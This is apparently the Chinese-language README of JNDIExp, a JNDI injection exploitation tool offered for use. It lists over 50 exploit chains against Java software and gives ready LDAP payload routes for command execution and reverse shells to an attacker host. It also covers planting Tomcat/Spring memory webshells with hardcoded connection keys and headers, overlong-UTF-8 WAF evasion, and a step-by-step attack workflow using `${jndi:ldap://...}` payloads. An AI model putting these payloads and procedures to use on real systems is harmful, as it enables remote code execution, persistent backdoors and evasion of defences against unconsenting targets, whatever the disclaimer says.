# JNDIExp

JNDI 注入利用工具。支持 50+ 利用链，覆盖反序列化 gadget、BeanFactory Reference、JDBC 连接池、高版本 Tomcat 替代方案，内置 DNS 探测和对抗投递能力。

## 免责声明

本工具仅用于授权安全测试与研究。使用者须遵守当地法律法规，因非法使用造成的后果由使用者自行承担。

## 安装

```bash
git clone <repo-url>
cd JNDIEXP-main
mvn package -DskipTests
```

产出：`target/JNDIInject-1.4.jar`（约 54MB，包含全部 gadget 依赖）

## 快速开始

```bash
# 启动 LDAP + HTTP 服务
java -jar JNDIInject-1.4.jar -i <your-ip>

# 验证路由（不启动服务）
java -jar JNDIInject-1.4.jar -i <your-ip> --dry-run

# 查看完整用法
java -jar JNDIInject-1.4.jar -u
```

## 命令行参数

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `-i, --ip` | 本机 IP 地址 | 0.0.0.0 |
| `-l, --ldapPort` | LDAP 监听端口 | 1389 |
| `-p, --httpPort` | HTTP 监听端口 | 8080 |
| `-u, --usage` | 显示完整用法 | false |
| `-d, --dry-run` | 验证模式（不启动服务） | false |
| `--test-routes` | 指定测试路由（逗号分隔） | 空 |
| `--force-serialize` | 强制序列化输出（BeanFactory 系链） | false |
| `-h, --help` | 显示帮助 | - |

## 路由格式

所有路由不区分大小写。

### basic — 低版本 JDK（< 8u191）

```
ldap://<ip>:1389/basic/<cmd>
ldap://<ip>:1389/basic/base64/<base64_cmd>
ldap://<ip>:1389/basic/reverseshell/<ip>/<port>
ldap://<ip>:1389/basic/reverseshell2/<ip>/<port>
ldap://<ip>:1389/basic/memshell/<type>
ldap://<ip>:1389/basic/memshell/GEN:tomcat/cmd/filter
```

### gadget 链 — 高版本 JDK 绕过

```
ldap://<ip>:1389/<PayloadType>/<cmd>
ldap://<ip>:1389/<PayloadType>/base64/<base64_cmd>
ldap://<ip>:1389/<PayloadType>/reverseshell/<ip>/<port>
ldap://<ip>:1389/<PayloadType>/memshell/<type>
ldap://<ip>:1389/<PayloadType>/memshell/GEN:<server>/<tool>/<type>
```

### DNS 探测 — 一次请求探测全部依赖

```
ldap://<ip>:1389/fuzzbyDNS/<dnslog-domain>
ldap://<ip>:1389/fuzz/<PayloadType>/<dnslog-domain>
ldap://<ip>:1389/URLDNS/<dnslog-domain>
```

## 支持的利用链

### TemplatesImpl 反序列化链（支持 cmd/memshell）

目标需有对应依赖，通过 `javaSerializedData` 投递。

| 链 | 目标依赖 |
|---|---|
| CommonsCollections1/3/5/6/7/8/12 | commons-collections 3.x |
| CommonsCollections2/4, CommonsCollectionsK1-K4 | commons-collections4 |
| CommonsBeanutils1/183NOCC/192NOCC | commons-beanutils |
| Spring1/2 | spring-core + spring-aop |
| Hibernate1 | hibernate-core |
| Clojure | clojure |
| BeanShell1 | bsh |
| JSON1 | json-lib + ezmorph |
| MozillaRhino1 | rhino |
| Vaadin1 | vaadin-server |
| rome | rome |
| C3P0 | c3p0（远程类加载，格式 `url:ClassName`） |

### BeanFactory Reference 链（不依赖 javaSerializedData 信任）

新 JDK 默认直返 Reference 属性，绕过 `trustSerialData=false` 限制。需要目标 Tomcat 未修补 `forceString`（< 8.5.79 / 9.0.63 / 10.0.21）。

| 链 | 目标依赖 | 说明 |
|---|---|---|
| EL | javax.el（Tomcat ≤9） | EL 表达式执行 |
| ELjakarta | jakarta.el（Tomcat 10+） | 同上，jakarta 命名空间 |
| tomcat_jshell | ELProcessor + JDK 9+ | Java 15+ Nashorn 移除后的替代 |
| groovyBytomcat | Groovy | Groovy 脚本执行 |
| snakeyaml | snakeyaml | 远程 jar 加载（格式 `http://url/exp.jar`） |
| XStream | XStream | 反序列化触发 |
| mvel | mvel2 | MVEL 表达式执行 |
| BeanShell2 | bsh | BeanShell eval |
| fastjson1 | fastjson 1.2.x | JSON.parse + @type |
| fastjson2 | fastjson2 | JSON.parse + @type |
| hessian | hessian | Hessian 代理远程连接 |
| jackson | jackson-databind | ObjectMapper.readValue + @class |
| mlet | JDK 自带 | JMX MLet 远程类加载 |

### JDBC 连接池链（通过 DataSourceFactory 触发）

不依赖 `forceString`，通过连接池工厂创建 JDBC 连接。

| 链 | 说明 | 命令格式 |
|---|---|---|
| tomcat_dbcp1/2_RCE | Tomcat DBCP + H2 JS | OS 命令 |
| commons_dbcp1/2_RCE | Commons DBCP + H2 JS | OS 命令 |
| druidjdbc | Druid + H2 JS | OS 命令 |
| tomcatjdbc | Tomcat JDBC + H2 JS | OS 命令 |
| h2_alias | H2 CREATE ALIAS（不依赖 JS 引擎） | OS 命令 |
| h2_runscript | H2 RUNSCRIPT 远程 SQL | 远程 SQL URL |
| h2_groovy | H2 + Groovy 引擎 | OS 命令 |
| postgresql_socketFactory | PG socketFactory 实例化 | `className#arg` |
| mysql_deserialize | MySQL 8.x 反序列化 | 假服务器 `ip:port` |
| mysql_deserialize5 | MySQL 5.x 反序列化 | 假服务器 `ip:port` |
| mysql_fileread | MySQL 客户端文件读 | `ip:port#/path` |
| derby_rce | Derby connectionInitSqls | OS 命令或远程 jar |
| hikaricp_h2 | HikariCP + H2（需 forceString） | OS 命令 |
| hsqldb_initSql | HSQLDB initSQL Java 方法调用 | HSQLDB jdbc URL |

### 高版本 Tomcat 替代方案（forceString 已移除）

| 链 | 说明 | 命令格式 |
|---|---|---|
| tomcat_memUserDb | MemoryUserDatabaseFactory 任意文件写 | 远程 XML URL（含路径穿越写 JSP） |
| tomcat_xxe | MemoryUserDatabaseFactory Blind XXE | 含 DTD 的远程 XML URL |

### DNS 探测

| 链 | 说明 |
|---|---|
| URLDNS | 单条 DNS 解析验证 |
| fuzzbyDNS | 一次请求批量探测 50+ 标记类 |
| fuzz/\<type\> | 单链精确 DNS 探测 |

## 内存马

### 内置类型

| 类型 | 说明 |
|------|------|
| TomcatFilterMemShellFromThread | Filter 型（推荐） |
| TomcatListenerMemShellFromThread | Listener 型 |
| TomcatServletMemShellFromThread | Servlet 型（访问 `/ser`） |
| TomcatFilterMemShellFromJMX | Filter 型（JMX 注入） |
| TomcatListenerMemShellFromJMX | Listener 型（JMX 注入） |
| TomcatServletMemShellFromJMX | Servlet 型（JMX 注入） |
| TomcatListenerNeoRegFromThread | Neo-reGeorg 隧道 |
| TomcatCmdEcho | 命令回显 |
| SpringInterceptorMemShell | Spring Interceptor 型 |

### GEN: 组合模式

格式：`GEN:<server>/<tool>/<type>`

```
ldap://<ip>:1389/CommonsCollections1/memshell/GEN:tomcat/cmd/filter
ldap://<ip>:1389/CommonsCollections2/memshell/GEN:tomcat/behinder/servlet
ldap://<ip>:1389/CommonsCollectionsK1/memshell/GEN:tomcat/godzilla/listener
```

### 连接密钥

- 密码/Key：`ck4Gr4Qi`
- 命令回显 Header：`Referer: https://www.google.com/` + `x-client-data: cmd` + `cmd: <command>`
- 冰蝎 Header：`Referer: https://www.google.com/` + `x-client-data: rebeyond`
- 哥斯拉 Header：`Referer: https://www.google.com/` + `x-client-data: godzilla`

## fuzzbyDNS 判读规则

探针 URL 格式：`http://{marker}.{runId}.{domain}`

1. `ctrlp`（java.lang.Object）必须触发。未触发 = 反序列化不可达或 DNS 被拦。
2. `ctrln`（不存在的类）必须不触发。触发 = 环境有误报。
3. 一次请求产出全部结果，无需逐条发送。
4. 限制：通过 `javaSerializedData` 投递，JDK 8u431+ / 11.0.25+ / 17.0.13+ / 21.0.5+ 默认 `trustSerialData=false` 时整批失效。

### 探针清单

| 组 | marker | 含义 |
|---|---|---|
| 对照 | ctrlp / ctrln | 正控/负控 |
| JDK | jdk8 / jdk9 / jdk11p / Jdk7u21 / JRE8u20 | 版本区间 |
| OS | linux / windows | 操作系统 |
| CC | cc31or321 / cc322 / cc40 / cc41 | commons-collections 版本 |
| CB | cb17 / cb18x / cb19x / cb1 | commons-beanutils 版本 |
| BeanFactory | el / jel / mvel / snakeyaml / XStream / becl | 可用 BeanFactory 链 |
| JDBC | h2 / druid / tomcatjdbc / tdbcp1/2 / cdbcp1/2 / postgresql / mysql8 / mysql5 / hikaricp | JDBC 驱动和连接池 |
| 反序列化 | hibernate / json1 / fileupload1 / rome / rhino1 / clojure | gadget 依赖 |
| 高版本替代 | memUserDb / velocity / jshell / fastjson1 / fastjson2 / hessian / jackson | 新链前置依赖 |
| 其他 | BeanShell2 / bsh20b4-b6 / groovy* / c3p0* | 版本段细分 |

## 对抗投递

`PayloadObfuscator` 工具类提供序列化流后处理能力：

- **UTF-8 Overlong 2 字节**：ASCII 字符编码为 Modified UTF-8 双字节，绕过标准 UTF-8 WAF 匹配
- **UTF-8 Overlong 3 字节**：更强混淆，兼容性略低
- **类名替换**：对序列化流中指定类名做 overlong 编码，长度字段自动修正

Java `ObjectInputStream` 使用 Modified UTF-8（允许 overlong），标准 UTF-8 WAF 无法解码。

## 验证

```bash
# 编译 + 单元测试（85 用例）
mvn test

# dry-run 路由验证
java -jar target/JNDIInject-1.4.jar -i 127.0.0.1 --dry-run

# 指定路由验证
java -jar target/JNDIInject-1.4.jar -i 127.0.0.1 --dry-run \
  --test-routes "basic/base64/d2hvYW1p,EL/reverseshell/127.0.0.1/4444"
```

## 使用流程

1. VPS 启动工具：`java -jar JNDIInject-1.4.jar -i <vps-ip>`
2. 探测目标依赖：`${jndi:ldap://<vps-ip>:1389/fuzzbyDNS/<dnslog>}`
3. 根据 DNS 结果选择可用链路
4. 投递 payload：`${jndi:ldap://<vps-ip>:1389/<chain>/<cmd>}`

## 致谢

参考/引用了 Rogue JNDI、JNDIExploit、ysoserial、Y4er、c0ny1 等项目。

## License

仅供安全研究使用。
